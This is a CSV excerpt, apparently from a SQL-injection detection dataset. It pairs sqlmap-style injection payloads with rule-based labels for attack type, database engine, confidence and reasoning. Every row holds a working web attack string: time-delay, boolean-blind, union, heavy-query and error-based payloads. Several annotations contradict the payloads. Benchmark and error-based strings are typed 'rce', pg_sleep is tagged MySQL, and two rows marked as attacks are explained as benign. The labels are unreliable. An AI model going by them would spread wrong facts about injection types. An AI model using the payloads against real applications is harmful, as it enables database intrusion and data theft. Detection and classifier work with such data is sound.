row_index,payload_norm,label,sqli_type_hint,sqli_type,db_engine,confidence,reasoning,label_source
10242,"1"" ) or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 ) and ( ""dwpa"" = ""dwpa",1,,boolean_blind,generic,0.95,) and ( detected — boolean_blind injection (priority 8) on generic,rule-based
10243,"1"" ) where 7914 = 7914 rlike ( select * from ( select ( sleep ( 5 ) ) ) vwyq ) #",1,,time_blind,mysql,0.95,sleep ( is MySQL-specific time-delay function — time-based blind inference (priority 5),rule-based
10244,"1 ) as ahfj where 4776 = 4776 or 7417 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",1,,heavy_query,db2,0.95,"select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm detected — heavy_query injection (priority 6) on db2",rule-based
10245,1' ) ) and 7533 = 7533 and ( ( 'ialm' = 'ialm,1,,boolean_blind,generic,0.95,7533 = 7533 and detected — boolean_blind injection (priority 8) on generic,rule-based
10246,"1 ) ) and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 ) and ( ( 6010 = 6010",1,,boolean_blind,generic,0.95,) and ( detected — boolean_blind injection (priority 8) on generic,rule-based
10247,"1"" ) ) ) waitfor delay '0:0:5' and ( ( ( ""ckht"" = ""ckht",1,,time_blind,mssql,0.95,waitfor delay is MSSQL-specific time-delay function — time-based blind inference (priority 5),rule-based
10248,"1'|| ( select 'gopc' where 7386 = 7386 and make_set ( 9375 = 7963,7963 ) ) ||'",1,,boolean_blind,generic,0.95,7386 = 7386 and detected — boolean_blind injection (priority 8) on generic,rule-based
10249,"1"" ) where 4588 = 4588",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
10250,"1%"" ) or 8466 = benchmark ( 5000000,md5 ( 0x694a4745 ) ) and ( ""%"" = """,1,,rce,generic,0.95,0x694a4745 detected — rce injection (priority 1) on generic,rule-based
10251,"1 ( select ( case when ( 4587 = 4587 ) then regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) else char ( 76 ) ||char ( 65 ) ||char ( 102 ) ||char ( 72 ) end ) from ( values ( 0 ) ) )",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
10252,"-2855' union all select 2495,2495,2495,2495,2495,2495,2495,2495,2495--",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
10253,"1'|| ( select 'flre' where 8250 = 8250 or 8421 = ( select count ( * ) from generate_series ( 1,5000000 ) ) ) ||'",1,,heavy_query,generic,0.95,"generate_series (, select count ( * ) from generate_series ( 1,5000000 detected — heavy_query injection (priority 6) on generic",rule-based
10254,"1' ) ) procedure analyse ( extractvalue ( 9627,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x4b774c75 ) ) ) ) ) ,1 ) #",1,,rce,generic,0.95,0x4b774c75 detected — rce injection (priority 1) on generic,rule-based
10255,"1"" ) ) ) and make_set ( 7809 = 9564,9564 ) and ( ( ( ""jggk"" like ""jggk",1,,boolean_blind,generic,0.95,") and (, like "" detected — boolean_blind injection (priority 8) on generic",rule-based
10256,"1 ) ) as wezj where 2869 = 2869 and ( select 9067 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9067 = 9067,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) --",1,,rce,mysql,0.95,0x7171706a71 detected — rce injection (priority 1) on mysql,rule-based
10257,1' ) or 6793 = ( select 6793 from pg_sleep ( 5 ) ) and ( 'fupe' = 'fupe,1,,time_blind,mysql,0.95,"sleep (, pg_sleep ( is PostgreSQL-specific time-delay function — time-based blind inference (priority 5)",rule-based
10258,-5615' ) where 5931 = 5931 or 8450 = 9229,1,,boolean_blind,generic,0.95,5931 = 5931 or detected — boolean_blind injection (priority 8) on generic,rule-based
10259,"-5143'+ ( select 'zyrr' where 8405 = 8405 union all select 8405,8405,8405,8405#",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
